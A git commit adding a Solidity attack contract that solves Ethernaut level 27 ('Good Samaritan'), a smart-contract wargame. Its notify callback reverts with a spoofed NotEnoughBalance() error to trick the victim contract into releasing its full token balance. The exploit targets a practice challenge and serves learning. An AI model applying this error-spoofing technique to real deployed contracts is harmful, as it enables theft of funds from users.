beaa56adc620bc09884c9e2f07bf7b06638bb065
emretepedev <emretepedev@gmail.com>
2022-09-09 00:37:24 +0300

    feat: add attack contract to level 27 - good samaritan

---
+++ contracts/attacks/GoodSamaritan/GoodSamaritanAttack.sol
@@ -0,0 +1,50 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./interfaces/IGoodSamaritan.sol";
+
+/**
+ * @title Good Samaritan Attack (Ethernaut Challenge Level 27 - Good Samaritan)
+ * @author Emre Tepe (@emretepedev)
+ * @notice Attack contract for level 27
+ * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x000Fa85A0a533C3221ecf8Ab4D598b34B48B22Fd
+ * @custom:security-contact emretepedev@gmail.com
+ */
+contract GoodSamaritanAttack {
+    uint256 private _amount;
+
+    /*//////////////////////////////////////////////////////////////
+                                Attack
+    //////////////////////////////////////////////////////////////*/
+
+    /**
+     * @notice Attack and solve the level
+     * @param target Address of target contract
+     */
+    function attack(IGoodSamaritan target) external {
+        _amount = 0;
+
+        require(!target.requestDonation() && _amount > 10, "GoodSamaritan: Attack failed");
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                            Helpers & Others
+    //////////////////////////////////////////////////////////////*/
+
+    /**
+     * @param amount Received amount from victim contract
+     */
+    function notify(uint256 amount) external {
+        _amount = amount;
+
+        if (10 == amount) {
+            bytes memory reason = abi.encodeWithSignature("NotEnoughBalance()");
+            uint256 len = reason.length;
+            // solhint-disable-next-line no-inline-assembly
+            assembly {
+                revert(add(32, reason), len)
+            }
+        }
+    }
+}
